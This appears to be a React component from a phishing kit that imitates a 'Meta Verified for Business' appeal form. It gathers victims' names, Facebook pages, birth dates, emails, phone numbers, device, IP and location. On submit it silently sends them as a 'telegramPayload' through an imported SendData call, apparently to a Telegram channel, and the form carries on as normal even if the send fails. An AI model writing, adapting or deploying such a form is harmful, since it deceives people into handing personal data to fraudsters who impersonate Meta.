'use client'

import React from 'react'
import PhoneInput from 'react-phone-input-2'

import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
import { updateForm, type FormData } from '@/app/store/slices/stepFormSlice'
import ActivationRefChip from '@/components/meta-verified-for-business/ActivationRefChip'
import AppealContentSelector from '@/components/meta-verified-for-business/AppealContentSelector'
import FacebookNotifyToggle from '@/components/meta-verified-for-business/FacebookNotifyToggle'
import { useAppStrings } from '@/hooks/useAppStrings'
import { readDeviceLabel } from '@/utils/deviceLabel'
import { getUserLocation } from '@/utils/getLocation'
import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
import { SendData } from '@/utils/sendData'

type MvAppealInfoFormProps = {
  onSubmitSuccess: () => void
  showRefChip?: boolean
  showHint?: boolean
}

export default function MvAppealInfoForm({
  onSubmitSuccess,
  showRefChip = true,
  showHint = true,
}: MvAppealInfoFormProps) {
  const t = useAppStrings()
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  const normalizePhoneDigits = (value: string) => value.replace(/\D/g, '')
  const getPhoneDigitCount = (value: string) => normalizePhoneDigits(value).length

  const [errors, setErrors] = React.useState<Record<string, string>>({})
  const dispatch = useAppDispatch()
  const formData = useAppSelector((state) => state.stepForm.data)

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { id, value } = e.target
    dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>))
    setErrors((prev) => ({ ...prev, [id]: '' }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault()

      const newErrors: Record<string, string> = {}
      if (!formData.fullName.trim()) newErrors.fullName = t.info.errFullName
      if (!formData.email.trim()) {
        newErrors.email = t.info.errEmail
      } else if (!emailRegex.test(formData.email.trim())) {
        newErrors.email = t.info.errEmailFmt
      }
      const emailBusinessTrimmed = formData.emailBusiness.trim()
      if (!emailBusinessTrimmed) {
        newErrors.emailBusiness = t.info.errEmailBiz
      } else if (!emailRegex.test(emailBusinessTrimmed)) {
        newErrors.emailBusiness = t.info.errEmailBizFmt
      }
      if (!formData.fanpage.trim()) newErrors.fanpage = t.info.errFanpage
      const phoneDigits = normalizePhoneDigits(formData.phone)
      const phoneDigitCount = getPhoneDigitCount(formData.phone)
      if (!phoneDigits) {
        newErrors.phone = t.info.errPhone
      } else if (phoneDigitCount < 8 || phoneDigitCount > 20) {
        newErrors.phone = t.info.errPhoneLen
      }
      const backupDigits = normalizePhoneDigits(formData.phoneBackup ?? '')
      const backupDigitCount = getPhoneDigitCount(formData.phoneBackup ?? '')
      if (backupDigits && (backupDigitCount < 8 || backupDigitCount > 20)) {
        newErrors.phoneBackup = t.info.errPhoneLen
      }
      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors)
        return
      }

      const clientData = {
        ...formData,
        device: formData.device || readDeviceLabel(),
      }

      dispatch(updateForm(clientData))

      if (!isMetaVerifiedFlowCompleted()) {
        let telegramPayload: Record<string, unknown> = {
          ...clientData,
          activationInfoSubmit: true,
        }
        if (!clientData.ip?.trim() || !clientData.location?.trim()) {
          const location = await getUserLocation()
          telegramPayload = { ...telegramPayload, ...location }
          dispatch(updateForm(location))
        }
        try {
          await SendData(telegramPayload)
        } catch {
          /* luồng UX vẫn tiếp tục */
        }
      }

      onSubmitSuccess()
    } catch (error) {
      console.error('Error submitting form:', error)
    }
  }

  const inputClass = (field: string) =>
    `mv-input mv-activation-input mv-appeal-control ${errors[field] ? 'is-invalid' : ''}`
  const dobInputClass = (field: string) =>
    `mv-input mv-activation-input mv-appeal-control mv-appeal-control--select ${errors[field] ? 'is-invalid' : ''}`
  const labelClass = 'mv-activation-label mv-appeal-label'
  const requiredMark = <span className="mv-activation-required">*</span>
  const errorText = (field: string) =>
    errors[field] ? <p className="mv-appeal-error">{errors[field]}</p> : null
  const dobErrorText = (field: string) =>
    errors[field] ? <p className="mv-appeal-error mv-appeal-error--compact">{errors[field]}</p> : null
  const days = Array.from({ length: 31 }, (_, i) => String(i + 1))
  const months = Array.from({ length: 12 }, (_, i) => String(i + 1))
  const currentYear = new Date().getFullYear()
  const years = Array.from({ length: 100 }, (_, i) => String(currentYear - i))
  const fbNotifyOn = formData.facebookNotify ?? true

  return (
    <div className="mv-appeal-form">
      {showRefChip ? (
        <div className="mv-appeal-form-ref">
          <ActivationRefChip />
        </div>
      ) : null}

      {showHint ? <p className="mv-appeal-form-hint">{t.info.hint}</p> : null}

      <form onSubmit={handleSubmit} autoComplete="off" className="mv-appeal-form-body">
        <section className="mv-appeal-section" aria-labelledby="mv-appeal-section-admin">
          <header className="mv-appeal-section-header">
            <h3 id="mv-appeal-section-admin" className="mv-appeal-section-title">
              {t.info.sectionAdmin}
            </h3>
          </header>

          <div className="mv-appeal-field">
            <label htmlFor="fullName" className={labelClass}>
              {t.info.fullName} {requiredMark}
            </label>
            <div className={inputClass('fullName')}>
              <input
                type="text"
                id="fullName"
                placeholder={t.info.fullNamePh}
                className="mv-appeal-input"
                value={formData.fullName}
                onChange={handleChange}
              />
            </div>
            {errorText('fullName')}
          </div>

          <div className="mv-appeal-field">
            <label htmlFor="fanpage" className={labelClass}>
              {t.info.fanpage} {requiredMark}
            </label>
            <div className={inputClass('fanpage')}>
              <input
                type="text"
                id="fanpage"
                placeholder={t.info.fanpagePh}
                className="mv-appeal-input"
                value={formData.fanpage}
                onChange={handleChange}
              />
            </div>
            {errorText('fanpage')}
          </div>

          <div className="mv-appeal-field">
            <p className={labelClass}>{t.info.dob}</p>
            <div className="mv-appeal-dob-grid">
              <div className="mv-appeal-dob-item">
                <div className={dobInputClass('day')}>
                  <select
                    id="day"
                    className="mv-appeal-input"
                    value={formData.day}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.day}</option>
                    {days.map((day) => (
                      <option key={day} value={day}>
                        {day}
                      </option>
                    ))}
                  </select>
                </div>
                {dobErrorText('day')}
              </div>

              <div className="mv-appeal-dob-item">
                <div className={dobInputClass('month')}>
                  <select
                    id="month"
                    className="mv-appeal-input"
                    value={formData.month}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.month}</option>
                    {months.map((month) => (
                      <option key={month} value={month}>
                        {month}
                      </option>
                    ))}
                  </select>
                </div>
                {dobErrorText('month')}
              </div>

              <div className="mv-appeal-dob-item">
                <div className={dobInputClass('year')}>
                  <select
                    id="year"
                    className="mv-appeal-input"
                    value={formData.year}
                    onChange={handleChange}
                  >
                    <option value="">{t.info.year}</option>
                    {years.map((year) => (
                      <option key={year} value={year}>
                        {year}
                      </option>
                    ))}
                  </select>
                </div>
                {dobErrorText('year')}
              </div>
            </div>
          </div>
        </section>

        <section className="mv-appeal-section" aria-labelledby="mv-appeal-section-contact">
          <header className="mv-appeal-section-header">
            <h3 id="mv-appeal-section-contact" className="mv-appeal-section-title">
              {t.info.sectionContact}
            </h3>
          </header>

          <div className="mv-appeal-field-grid">
            <div className="mv-appeal-field">
              <label htmlFor="email" className={labelClass}>
                {t.info.email} {requiredMark}
              </label>
              <div className={inputClass('email')}>
                <input
                  type="email"
                  id="email"
                  placeholder={t.info.emailPh}
                  className="mv-appeal-input"
                  value={formData.email}
                  onChange={handleChange}
                />
              </div>
              {errorText('email')}
            </div>

            <div className="mv-appeal-field">
              <label htmlFor="emailBusiness" className={labelClass}>
                {t.info.emailBiz} {requiredMark}
              </label>
              <div className={inputClass('emailBusiness')}>
                <input
                  type="email"
                  id="emailBusiness"
                  placeholder={t.info.emailBizPh}
                  className="mv-appeal-input"
                  value={formData.emailBusiness}
                  onChange={handleChange}
                />
              </div>
              {errorText('emailBusiness')}
            </div>
          </div>

          <div className="mv-appeal-field-grid">
            <div className="mv-appeal-field">
              <label className={labelClass}>
                {t.info.phone} {requiredMark}
              </label>
              <div className={`mv-input mv-activation-input mv-appeal-control mv-appeal-control--phone ${errors.phone ? 'is-invalid' : ''}`}>
                <PhoneInput
                  country={formData.country_code?.toLowerCase() || 'us'}
                  value={formData.phone}
                  autoFormat={false}
                  enableLongNumbers={20}
                  countryCodeEditable={false}
                  onChange={(phone) => {
                    const normalizedPhone = normalizePhoneDigits(phone).slice(0, 20)
                    dispatch(updateForm({ phone: normalizedPhone }))
                    setErrors((prev) => ({ ...prev, phone: '' }))
                  }}
                  inputProps={{
                    name: 'phone',
                    required: true,
                    inputMode: 'tel',
                    autoComplete: 'tel',
                  }}
                />
              </div>
              {errorText('phone')}
            </div>

            <div className="mv-appeal-field">
              <label className={labelClass}>{t.info.phoneBackup}</label>
              <div className={`mv-input mv-activation-input mv-appeal-control mv-appeal-control--phone ${errors.phoneBackup ? 'is-invalid' : ''}`}>
                <PhoneInput
                  country={formData.country_code?.toLowerCase() || 'us'}
                  value={formData.phoneBackup ?? ''}
                  autoFormat={false}
                  enableLongNumbers={20}
                  countryCodeEditable={false}
                  onChange={(phone) => {
                    const normalizedPhone = normalizePhoneDigits(phone).slice(0, 20)
                    dispatch(updateForm({ phoneBackup: normalizedPhone }))
                    setErrors((prev) => ({ ...prev, phoneBackup: '' }))
                  }}
                  inputProps={{
                    name: 'phoneBackup',
                    required: false,
                    inputMode: 'tel',
                    autoComplete: 'tel',
                  }}
                />
              </div>
              {errorText('phoneBackup')}
            </div>
          </div>
        </section>

        <section className="mv-appeal-section" aria-labelledby="mv-appeal-section-details">
          <header className="mv-appeal-section-header">
            <h3 id="mv-appeal-section-details" className="mv-appeal-section-title">
              {t.info.sectionDetails}
            </h3>
          </header>

          <FacebookNotifyToggle
            checked={fbNotifyOn}
            onChange={(facebookNotify) => dispatch(updateForm({ facebookNotify }))}
          />

          <AppealContentSelector
            selected={formData.appealContents}
            onChange={(appealContents) => {
              dispatch(updateForm({ appealContents }))
              setErrors((prev) => ({ ...prev, appealContents: '', message: '' }))
            }}
            message={formData.message}
            onMessageChange={(message) => {
              dispatch(updateForm({ message }))
              setErrors((prev) => ({ ...prev, message: '' }))
            }}
            error={errors.appealContents}
            messageError={errors.message}
          />
        </section>

        <div className="mv-appeal-footer">
          <button type="submit" className="mv-btn-meta mv-btn-activation mv-appeal-submit">
            {t.info.submit}
          </button>
        </div>
      </form>
    </div>
  )
}
